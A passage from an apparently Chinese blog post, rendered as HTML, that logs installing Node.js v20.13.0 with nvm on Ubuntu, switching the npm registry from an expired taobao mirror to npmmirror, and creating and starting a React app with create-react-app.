class="hljs-keyword">if</span> it exists<br>    --latest-npm                            After installing, attempt to upgrade to the latest working npm on the given node version<br>    --no-progress                           Disable the progress bar on any downloads<br>  nvm uninstall &lt;version&gt;                   Uninstall a version<br>  nvm uninstall --lts                       Uninstall using automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>  nvm uninstall --lts=&lt;LTS name&gt;            Uninstall using automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm use [--silent] &lt;version&gt;              Modify PATH to use &lt;version&gt;. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    --lts                                   Uses automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>    --lts=&lt;LTS name&gt;                        Uses automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm <span class="hljs-built_in">exec</span> [--silent] &lt;version&gt; [&lt;<span class="hljs-built_in">command</span>&gt;] Run &lt;<span class="hljs-built_in">command</span>&gt; on &lt;version&gt;. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    --lts                                   Uses automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>    --lts=&lt;LTS name&gt;                        Uses automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm run [--silent] &lt;version&gt; [&lt;args&gt;]     Run `node` on &lt;version&gt; with &lt;args&gt; as arguments. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    --lts                                   Uses automatic LTS (long-term support) <span class="hljs-built_in">alias</span> `lts/*`, <span class="hljs-keyword">if</span> available.<br>    --lts=&lt;LTS name&gt;                        Uses automatic <span class="hljs-built_in">alias</span> <span class="hljs-keyword">for</span> provided LTS line, <span class="hljs-keyword">if</span> available.<br>  nvm current                               Display currently activated version of Node<br>  nvm <span class="hljs-built_in">ls</span> [&lt;version&gt;]                        List installed versions, matching a given &lt;version&gt; <span class="hljs-keyword">if</span> provided<br>    --no-colors                             Suppress colored output<br>    --no-alias                              Suppress `nvm <span class="hljs-built_in">alias</span>` output<br>  nvm ls-remote [&lt;version&gt;]                 List remote versions available <span class="hljs-keyword">for</span> install, matching a given &lt;version&gt; <span class="hljs-keyword">if</span> provided<br>    --lts                                   When listing, only show LTS (long-term support) versions<br>    --lts=&lt;LTS name&gt;                        When listing, only show versions <span class="hljs-keyword">for</span> a specific LTS line<br>    --no-colors                             Suppress colored output<br>  nvm version &lt;version&gt;                     Resolve the given description to a single <span class="hljs-built_in">local</span> version<br>  nvm version-remote &lt;version&gt;              Resolve the given description to a single remote version<br>    --lts                                   When listing, only select from LTS (long-term support) versions<br>    --lts=&lt;LTS name&gt;                        When listing, only select from versions <span class="hljs-keyword">for</span> a specific LTS line<br>  nvm deactivate                            Undo effects of `nvm` on current shell<br>  nvm <span class="hljs-built_in">alias</span> [&lt;pattern&gt;]                     Show all aliases beginning with &lt;pattern&gt;<br>    --no-colors                             Suppress colored output<br>  nvm <span class="hljs-built_in">alias</span> &lt;name&gt; &lt;version&gt;                Set an <span class="hljs-built_in">alias</span> named &lt;name&gt; pointing to &lt;version&gt;<br>  nvm <span class="hljs-built_in">unalias</span> &lt;name&gt;                        Deletes the <span class="hljs-built_in">alias</span> named &lt;name&gt;<br>  nvm install-latest-npm                    Attempt to upgrade to the latest working `npm` on the current node version<br>  nvm reinstall-packages &lt;version&gt;          Reinstall global `npm` packages contained <span class="hljs-keyword">in</span> &lt;version&gt; to current version<br>  nvm unload                                Unload `nvm` from shell<br>  nvm <span class="hljs-built_in">which</span> [current | &lt;version&gt;]           Display path to installed node version. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>  nvm cache <span class="hljs-built_in">dir</span>                             Display path to the cache directory <span class="hljs-keyword">for</span> nvm<br>  nvm cache clear                           Empty cache directory <span class="hljs-keyword">for</span> nvm<br><br>Example:<br>  nvm install 8.0.0                     Install a specific version number<br>  nvm use 8.0                           Use the latest available 8.0.x release<br>  nvm run 6.10.3 app.js                 Run app.js using node 6.10.3<br>  nvm <span class="hljs-built_in">exec</span> 4.8.3 node app.js            Run `node app.js` with the PATH pointing to node 4.8.3<br>  nvm <span class="hljs-built_in">alias</span> default 8.1.0               Set default node version on a shell<br>  nvm <span class="hljs-built_in">alias</span> default node                Always default to the latest available node version on a shell<br><br>Note:<br>  to remove, delete, or uninstall nvm - just remove the `<span class="hljs-variable">$NVM_DIR</span>` folder (usually `~/.nvm`)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># nvm ls</span><br>               <br>-&gt;       system<br>iojs -&gt; N/A (default)<br>node -&gt; stable (-&gt; N/A) (default)<br>unstable -&gt; N/A (default)<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># nvm ls-remote |grep LTS</span><br>         v4.2.0   (LTS: Argon)<br>         v4.2.1   (LTS: Argon)<br>         v4.2.2   (LTS: Argon)<br>         v4.2.3   (LTS: Argon)<br>         v4.2.4   (LTS: Argon)<br>         v4.2.5   (LTS: Argon)<br>         v4.2.6   (LTS: Argon)<br>         v4.3.0   (LTS: Argon)<br>         v4.3.1   (LTS: Argon)<br>         v4.3.2   (LTS: Argon)<br>         v4.4.0   (LTS: Argon)<br>         v4.4.1   (LTS: Argon)<br>         v4.4.2   (LTS: Argon)<br>         v4.4.3   (LTS: Argon)<br>         v4.4.4   (LTS: Argon)<br>         v4.4.5   (LTS: Argon)<br>         v4.4.6   (LTS: Argon)<br>         v4.4.7   (LTS: Argon)<br>         v4.5.0   (LTS: Argon)<br>         v4.6.0   (LTS: Argon)<br>         v4.6.1   (LTS: Argon)<br>         v4.6.2   (LTS: Argon)<br>         v4.7.0   (LTS: Argon)<br>         v4.7.1   (LTS: Argon)<br>         v4.7.2   (LTS: Argon)<br>         v4.7.3   (LTS: Argon)<br>         v4.8.0   (LTS: Argon)<br>         v4.8.1   (LTS: Argon)<br>         v4.8.2   (LTS: Argon)<br>         v4.8.3   (LTS: Argon)<br>         v4.8.4   (LTS: Argon)<br>         v4.8.5   (LTS: Argon)<br>         v4.8.6   (LTS: Argon)<br>         v4.8.7   (LTS: Argon)<br>         v4.9.0   (LTS: Argon)<br>         v4.9.1   (Latest LTS: Argon)<br>         v6.9.0   (LTS: Boron)<br>         v6.9.1   (LTS: Boron)<br>         v6.9.2   (LTS: Boron)<br>         v6.9.3   (LTS: Boron)<br>         v6.9.4   (LTS: Boron)<br>         v6.9.5   (LTS: Boron)<br>        v6.10.0   (LTS: Boron)<br>        v6.10.1   (LTS: Boron)<br>        v6.10.2   (LTS: Boron)<br>        v6.10.3   (LTS: Boron)<br>        v6.11.0   (LTS: Boron)<br>        v6.11.1   (LTS: Boron)<br>        v6.11.2   (LTS: Boron)<br>        v6.11.3   (LTS: Boron)<br>        v6.11.4   (LTS: Boron)<br>        v6.11.5   (LTS: Boron)<br>        v6.12.0   (LTS: Boron)<br>        v6.12.1   (LTS: Boron)<br>        v6.12.2   (LTS: Boron)<br>        v6.12.3   (LTS: Boron)<br>        v6.13.0   (LTS: Boron)<br>        v6.13.1   (LTS: Boron)<br>        v6.14.0   (LTS: Boron)<br>        v6.14.1   (LTS: Boron)<br>        v6.14.2   (LTS: Boron)<br>        v6.14.3   (LTS: Boron)<br>        v6.14.4   (LTS: Boron)<br>        v6.15.0   (LTS: Boron)<br>        v6.15.1   (LTS: Boron)<br>        v6.16.0   (LTS: Boron)<br>        v6.17.0   (LTS: Boron)<br>        v6.17.1   (Latest LTS: Boron)<br>         v8.9.0   (LTS: Carbon)<br>         v8.9.1   (LTS: Carbon)<br>         v8.9.2   (LTS: Carbon)<br>         v8.9.3   (LTS: Carbon)<br>         v8.9.4   (LTS: Carbon)<br>        v8.10.0   (LTS: Carbon)<br>        v8.11.0   (LTS: Carbon)<br>        v8.11.1   (LTS: Carbon)<br>        v8.11.2   (LTS: Carbon)<br>        v8.11.3   (LTS: Carbon)<br>        v8.11.4   (LTS: Carbon)<br>        v8.12.0   (LTS: Carbon)<br>        v8.13.0   (LTS: Carbon)<br>        v8.14.0   (LTS: Carbon)<br>        v8.14.1   (LTS: Carbon)<br>        v8.15.0   (LTS: Carbon)<br>        v8.15.1   (LTS: Carbon)<br>        v8.16.0   (LTS: Carbon)<br>        v8.16.1   (LTS: Carbon)<br>        v8.16.2   (LTS: Carbon)<br>        v8.17.0   (Latest LTS: Carbon)<br>       v10.13.0   (LTS: Dubnium)<br>       v10.14.0   (LTS: Dubnium)<br>       v10.14.1   (LTS: Dubnium)<br>       v10.14.2   (LTS: Dubnium)<br>       v10.15.0   (LTS: Dubnium)<br>       v10.15.1   (LTS: Dubnium)<br>       v10.15.2   (LTS: Dubnium)<br>       v10.15.3   (LTS: Dubnium)<br>       v10.16.0   (LTS: Dubnium)<br>       v10.16.1   (LTS: Dubnium)<br>       v10.16.2   (LTS: Dubnium)<br>       v10.16.3   (LTS: Dubnium)<br>       v10.17.0   (LTS: Dubnium)<br>       v10.18.0   (LTS: Dubnium)<br>       v10.18.1   (LTS: Dubnium)<br>       v10.19.0   (LTS: Dubnium)<br>       v10.20.0   (LTS: Dubnium)<br>       v10.20.1   (LTS: Dubnium)<br>       v10.21.0   (LTS: Dubnium)<br>       v10.22.0   (LTS: Dubnium)<br>       v10.22.1   (LTS: Dubnium)<br>       v10.23.0   (LTS: Dubnium)<br>       v10.23.1   (LTS: Dubnium)<br>       v10.23.2   (LTS: Dubnium)<br>       v10.23.3   (LTS: Dubnium)<br>       v10.24.0   (LTS: Dubnium)<br>       v10.24.1   (Latest LTS: Dubnium)<br>       v12.13.0   (LTS: Erbium)<br>       v12.13.1   (LTS: Erbium)<br>       v12.14.0   (LTS: Erbium)<br>       v12.14.1   (LTS: Erbium)<br>       v12.15.0   (LTS: Erbium)<br>       v12.16.0   (LTS: Erbium)<br>       v12.16.1   (LTS: Erbium)<br>       v12.16.2   (LTS: Erbium)<br>       v12.16.3   (LTS: Erbium)<br>       v12.17.0   (LTS: Erbium)<br>       v12.18.0   (LTS: Erbium)<br>       v12.18.1   (LTS: Erbium)<br>       v12.18.2   (LTS: Erbium)<br>       v12.18.3   (LTS: Erbium)<br>       v12.18.4   (LTS: Erbium)<br>       v12.19.0   (LTS: Erbium)<br>       v12.19.1   (LTS: Erbium)<br>       v12.20.0   (LTS: Erbium)<br>       v12.20.1   (LTS: Erbium)<br>       v12.20.2   (LTS: Erbium)<br>       v12.21.0   (LTS: Erbium)<br>       v12.22.0   (LTS: Erbium)<br>       v12.22.1   (LTS: Erbium)<br>       v12.22.2   (LTS: Erbium)<br>       v12.22.3   (LTS: Erbium)<br>       v12.22.4   (LTS: Erbium)<br>       v12.22.5   (LTS: Erbium)<br>       v12.22.6   (LTS: Erbium)<br>       v12.22.7   (LTS: Erbium)<br>       v12.22.8   (LTS: Erbium)<br>       v12.22.9   (LTS: Erbium)<br>      v12.22.10   (LTS: Erbium)<br>      v12.22.11   (LTS: Erbium)<br>      v12.22.12   (Latest LTS: Erbium)<br>       v14.15.0   (LTS: Fermium)<br>       v14.15.1   (LTS: Fermium)<br>       v14.15.2   (LTS: Fermium)<br>       v14.15.3   (LTS: Fermium)<br>       v14.15.4   (LTS: Fermium)<br>       v14.15.5   (LTS: Fermium)<br>       v14.16.0   (LTS: Fermium)<br>       v14.16.1   (LTS: Fermium)<br>       v14.17.0   (LTS: Fermium)<br>       v14.17.1   (LTS: Fermium)<br>       v14.17.2   (LTS: Fermium)<br>       v14.17.3   (LTS: Fermium)<br>       v14.17.4   (LTS: Fermium)<br>       v14.17.5   (LTS: Fermium)<br>       v14.17.6   (LTS: Fermium)<br>       v14.18.0   (LTS: Fermium)<br>       v14.18.1   (LTS: Fermium)<br>       v14.18.2   (LTS: Fermium)<br>       v14.18.3   (LTS: Fermium)<br>       v14.19.0   (LTS: Fermium)<br>       v14.19.1   (LTS: Fermium)<br>       v14.19.2   (LTS: Fermium)<br>       v14.19.3   (LTS: Fermium)<br>       v14.20.0   (LTS: Fermium)<br>       v14.20.1   (LTS: Fermium)<br>       v14.21.0   (LTS: Fermium)<br>       v14.21.1   (LTS: Fermium)<br>       v14.21.2   (LTS: Fermium)<br>       v14.21.3   (Latest LTS: Fermium)<br>       v16.13.0   (LTS: Gallium)<br>       v16.13.1   (LTS: Gallium)<br>       v16.13.2   (LTS: Gallium)<br>       v16.14.0   (LTS: Gallium)<br>       v16.14.1   (LTS: Gallium)<br>       v16.14.2   (LTS: Gallium)<br>       v16.15.0   (LTS: Gallium)<br>       v16.15.1   (LTS: Gallium)<br>       v16.16.0   (LTS: Gallium)<br>       v16.17.0   (LTS: Gallium)<br>       v16.17.1   (LTS: Gallium)<br>       v16.18.0   (LTS: Gallium)<br>       v16.18.1   (LTS: Gallium)<br>       v16.19.0   (LTS: Gallium)<br>       v16.19.1   (LTS: Gallium)<br>       v16.20.0   (LTS: Gallium)<br>       v16.20.1   (LTS: Gallium)<br>       v16.20.2   (Latest LTS: Gallium)<br>       v18.12.0   (LTS: Hydrogen)<br>       v18.12.1   (LTS: Hydrogen)<br>       v18.13.0   (LTS: Hydrogen)<br>       v18.14.0   (LTS: Hydrogen)<br>       v18.14.1   (LTS: Hydrogen)<br>       v18.14.2   (LTS: Hydrogen)<br>       v18.15.0   (LTS: Hydrogen)<br>       v18.16.0   (LTS: Hydrogen)<br>       v18.16.1   (LTS: Hydrogen)<br>       v18.17.0   (LTS: Hydrogen)<br>       v18.17.1   (LTS: Hydrogen)<br>       v18.18.0   (LTS: Hydrogen)<br>       v18.18.1   (LTS: Hydrogen)<br>       v18.18.2   (LTS: Hydrogen)<br>       v18.19.0   (LTS: Hydrogen)<br>       v18.19.1   (LTS: Hydrogen)<br>       v18.20.0   (LTS: Hydrogen)<br>       v18.20.1   (LTS: Hydrogen)<br>       v18.20.2   (Latest LTS: Hydrogen)<br>        v20.9.0   (LTS: Iron)<br>       v20.10.0   (LTS: Iron)<br>       v20.11.0   (LTS: Iron)<br>       v20.11.1   (LTS: Iron)<br>       v20.12.0   (LTS: Iron)<br>       v20.12.1   (LTS: Iron)<br>       v20.12.2   (LTS: Iron)<br>       v20.13.0   (Latest LTS: Iron)<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># nvm install v20.13.0</span><br>Downloading and installing node v20.13.0...<br>Downloading https://nodejs.org/dist/v20.13.0/node-v20.13.0-linux-x64.tar.xz...<br><span class="hljs-comment">################################################################################################################################################################################# 100.0%</span><br>Computing checksum with <span class="hljs-built_in">sha256sum</span><br>Checksums matched!<br>Now using node v20.13.0 (npm v10.5.2)<br>Creating default <span class="hljs-built_in">alias</span>: default -&gt; v20.13.0<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># nvm ls</span><br>-&gt;     v20.13.0<br>         system<br>default -&gt; v20.13.0<br>node -&gt; stable (-&gt; v20.13.0) (default)<br>stable -&gt; 20.13 (-&gt; v20.13.0) (default)<br>iojs -&gt; N/A (default)<br>unstable -&gt; N/A (default)<br>lts/* -&gt; lts/iron (-&gt; v20.13.0)<br>lts/argon -&gt; v4.9.1 (-&gt; N/A)<br>lts/boron -&gt; v6.17.1 (-&gt; N/A)<br>lts/carbon -&gt; v8.17.0 (-&gt; N/A)<br>lts/dubnium -&gt; v10.24.1 (-&gt; N/A)<br>lts/erbium -&gt; v12.22.12 (-&gt; N/A)<br>lts/fermium -&gt; v14.21.3 (-&gt; N/A)<br>lts/gallium -&gt; v16.20.2 (-&gt; N/A)<br>lts/hydrogen -&gt; v18.20.2 (-&gt; N/A)<br>lts/iron -&gt; v20.13.0<br><br></code></pre></td></tr></table></figure><h1 id="开始安装，贼慢"><a href="#开始安装，贼慢" class="headerlink" title="开始安装，贼慢"></a>开始安装，贼慢</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br><br>Creating a new React app <span class="hljs-keyword">in</span> /root/my-app.<br><br>Installing packages. This might take a couple of minutes.<br>Installing react, react-dom, and react-scripts with cra-template...<br><br>(<span class="hljs-comment">#########⠂⠂⠂⠂⠂⠂⠂⠂⠂) ⠋ idealTree:@babel/core: sill placeDep ROOT semver@7.6.1 OK for: react-scripts@5.0.1 want: ^7.3.5</span><br><br></code></pre></td></tr></table></figure><h1 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 原始</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config get registry</span><br>https://registry.npmjs.org/<br><br><br><span class="hljs-comment"># 换源</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config set registry https://registry.npm.taobao.org</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config get registry</span><br>https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><h1 id="重新安装，报错证书问题"><a href="#重新安装，报错证书问题" class="headerlink" title="重新安装，报错证书问题"></a>重新安装，报错证书问题</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br>npm ERR! code CERT_HAS_EXPIRED<br>npm ERR! errno CERT_HAS_EXPIRED<br>npm ERR! request to https://registry.npm.taobao.org/create-react-app failed, reason: certificate has expired<br><br>npm ERR! A complete <span class="hljs-built_in">log</span> of this run can be found <span class="hljs-keyword">in</span>: /root/.npm/_logs/2024-05-08T15_23_38_989Z-debug-0.log<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>原因：设置的淘宝镜像过期了</p><h1 id="重新换源"><a href="#重新换源" class="headerlink" title="重新换源"></a>重新换源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npm config set registry https://registry.npmmirror.com</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config get registry</span><br>https://registry.npmmirror.com<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># npm config list</span><br>; <span class="hljs-string">&quot;user&quot;</span> config from /root/.npmrc<br><br>registry = <span class="hljs-string">&quot;https://registry.npmmirror.com&quot;</span> <br><br>; node bin location = /root/.nvm/versions/node/v20.13.0/bin/node<br>; node version = v20.13.0<br>; npm <span class="hljs-built_in">local</span> prefix = /root<br>; npm version = 10.5.2<br>; cwd = /root<br>; HOME = /root<br>; Run `npm config <span class="hljs-built_in">ls</span> -l` to show all defaults.<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="再次安装，成功"><a href="#再次安装，成功" class="headerlink" title="再次安装，成功~"></a>再次安装，成功~</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br>Need to install the following packages:<br>create-react-app@5.0.1<br>Ok to proceed? (y) y<br><br>Creating a new React app <span class="hljs-keyword">in</span> /root/my-app.<br><br>Installing packages. This might take a couple of minutes.<br>Installing react, react-dom, and react-scripts with cra-template...<br><br><br>added 1489 packages <span class="hljs-keyword">in</span> 2m<br><br>258 packages are looking <span class="hljs-keyword">for</span> funding<br>  run `npm fund` <span class="hljs-keyword">for</span> details<br><br>Initialized a git repository.<br><br>Installing template dependencies using npm...<br><br>added 67 packages, and changed 1 package <span class="hljs-keyword">in</span> 10s<br><br>262 packages are looking <span class="hljs-keyword">for</span> funding<br>  run `npm fund` <span class="hljs-keyword">for</span> details<br>Removing template package using npm...<br><br><br>removed 1 package <span class="hljs-keyword">in</span> 4s<br><br>262 packages are looking <span class="hljs-keyword">for</span> funding<br>  run `npm fund` <span class="hljs-keyword">for</span> details<br><br>Created git commit.<br><br>Success! Created my-app at /root/my-app<br>Inside that directory, you can run several commands:<br><br>  npm start<br>    Starts the development server.<br><br>  npm run build<br>    Bundles the app into static files <span class="hljs-keyword">for</span> production.<br><br>  npm <span class="hljs-built_in">test</span><br>    Starts the <span class="hljs-built_in">test</span> runner.<br><br>  npm run eject<br>    Removes this tool and copies build dependencies, configuration files<br>    and scripts into the app directory. If you <span class="hljs-keyword">do</span> this, you can’t go back!<br><br>We suggest that you begin by typing:<br><br>  <span class="hljs-built_in">cd</span> my-app<br>  npm start<br><br>Happy hacking!<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 my-app]<span class="hljs-comment"># npm start</span><br>...<br><br><br>Compiled successfully!<br><br>You can now view my-app <span class="hljs-keyword">in</span> the browser.<br><br>  http://localhost:3000<br><br>Note that the development build is not optimized.<br>To create a production build, use npm run build.<br><br>webpack compiled 